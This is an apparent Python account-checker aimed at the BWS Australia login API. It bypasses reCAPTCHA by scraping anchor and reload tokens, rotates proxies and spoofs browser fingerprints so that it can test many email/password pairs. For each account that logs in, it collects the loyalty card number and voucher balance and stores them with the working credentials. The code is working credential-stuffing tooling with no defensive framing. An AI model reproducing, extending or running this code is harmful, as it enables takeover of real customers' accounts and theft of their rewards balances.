async def GetCaptchaToken(k: str, co: str, v: str, cb: str, proxy: str='', timeout: float=15.0)->str:
    proxies = {
        'https': f'http://{proxy}'
    } if proxy else None
    # https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfgSSAkAAAAAGN8y1tlYRRAWgiJtQ-HMNHxcqAR&co=aHR0cHM6Ly9id3MuY29tLmF1OjQ0Mw..&hl=en&v=-QbJqHfGOUB8nuVRLvzFLVed&size=invisible&cb=xuavdaluhk52
    # f'https://www.recaptcha.net/recaptcha/enterprise/anchor?ar=1&k={k}&co={co}&hl=en&v={v}&size=invisible&cb={cb}'
    url = f'https://www.google.com/recaptcha/api2/anchor?ar=1&k={k}&co={co}&hl=en&v={v}&size=invisible&cb={cb}'
    headers = {
        "Pragma": "no-cache",
        "cache-control": "no-cache",
        "User-Agent": getUserAgent(),
        "referer": url
    }
    try:
        async with AsyncSession(
                headers=headers,
                proxies=proxies,
                timeout=timeout,
                impersonate=choice(imp)
        ) as http:
            res = await http.get(url=url)
            TokenA = "".join(re.findall("type=\"hidden\" id=\"recaptcha-token\" value=\"(.*?)\"", res.text))
            DataPayload = {
                "v": v,
                "reason": "q",
                "c": TokenA,
                "k": k,
                "co": co,
                "size": "invisible",
                "cb": cb,
                "hl": "en"
            }
            # https://www.google.com/recaptcha/api2/reload?k=6LfgSSAkAAAAAGN8y1tlYRRAWgiJtQ-HMNHxcqAR
            # f'https://www.recaptcha.net/recaptcha/enterprise/reload?k={k}'
            url = f'https://www.google.com/recaptcha/api2/reload?k={k}'
            res = await http.post(url=url, data=DataPayload)
            return "".join(re.findall(r'\[\"rresp\",\"([\s\S]*?)\"', res.text))
    except Exception:
        return ''


async def login(user: str, pwd: str, proxy: str='', timeout: float=15.0)->dict:
    proxies = {
        'https': f'http://{proxy}'
    } if proxy else None
    url = 'https://api.bws.com.au/apis/ui/Login/Login'
    headers = {
        "pragma": "no-cache",
        "cache-control": "no-cache",
        'content-type': 'application/json; charset=UTF-8',
        "User-Agent": getUserAgent(),
    }
    result = {
        'status': 'recaptcha',
        'userInfo': f'{user}:{pwd}'
    }
    recap = await GetCaptchaToken('6LfgSSAkAAAAAGN8y1tlYRRAWgiJtQ-HMNHxcqAR', 'aHR0cHM6Ly9id3MuY29tLmF1OjQ0Mw..', '-QbJqHfGOUB8nuVRLvzFLVed', 's9xscdheh2f', proxy=proxy)
    if not recap:
        recap = await GetCaptchaToken('6LfgSSAkAAAAAGN8y1tlYRRAWgiJtQ-HMNHxcqAR', 'aHR0cHM6Ly9id3MuY29tLmF1OjQ0Mw..', '-QbJqHfGOUB8nuVRLvzFLVed', 's9xscdheh2f', proxy=proxy)
    if not recap:
        return result
    params = {
        "Action": "login",
        "Email": user,
        "GoogleReCaptchaResponse": recap,
        "Password": pwd,
        "RememberMe": True,
        "Version": "v3"
    }
    try:
        async with AsyncSession(
                headers=headers,
                proxies=proxies,
                timeout=timeout,
                impersonate=choice(imp)
        ) as http:
            res = await http.post(url=url, json=params)
            data = res.json()
            # print(data)
            LoginResult = data.get('LoginResult', 'InvalidToken')
            if LoginResult == 'InvalidToken':
                return result
            if LoginResult == 'Invalid':
                result['status'] = 'error'
                return result
            result['status'] = 'success'
            url = 'https://api.bws.com.au/apis/ui/shopper'
            res = await http.get(url)
            data = res.json()
            # print(data)
            EdrNumber = data.get('EdrNumber')
            if not EdrNumber:
                return result
            result['userInfo'] += f'|Card:{EdrNumber}'
            url = 'https://api.bws.com.au/apis/ui/EdrCard/BalanceSummary'
            res = await http.get(url)
            data = res.json()
            # print(data)
            SaveForLaterPreference = data.get('SaveForLaterPreference', {})
            if not SaveForLaterPreference:
                return result
            Preference = SaveForLaterPreference.get('Preference', 'null')
            balance = SaveForLaterPreference.get('RoundedCurrentVoucherBalance', 'null')
            PayOutDate = SaveForLaterPreference.get('PayOutDate', 'null')
            result['userInfo'] += f'|Preference:{Preference}|balance:{balance}|PayOutDate:{PayOutDate}'
    except Exception:
        result['status'] = 'timeout'
    return result


class Counts:
    counts: Counter = Counter()
    def __init__(self, **kwargs) -> None:
        self.counts.update(kwargs)

    @classmethod
    def _init(cls):
        cls.counts.clear()
        
    def __getattr__(self, __name: str) -> any:
        return self.counts.get(__name)

    @classmethod
    def _add(cls, key: str):
        if key not in 'timeout recaptcha': 
            cls.counts['complete'] += 1
        cls.counts[key] += 1

    @classmethod
    def _sub(cls, key: str):
        if cls.counts[key] > 0:
            cls.counts[key] -= 1

    @classmethod
    def _setattr(cls, key: str, value):
        cls.counts[key] = value

    @classmethod
    def _iter(cls):
        return cls.counts.items()
    
    @classmethod
    def _iterstr(cls):
        return ' | '.join(map(lambda k: f'{k[0]}: {k[-1]}', cls.counts.items()))

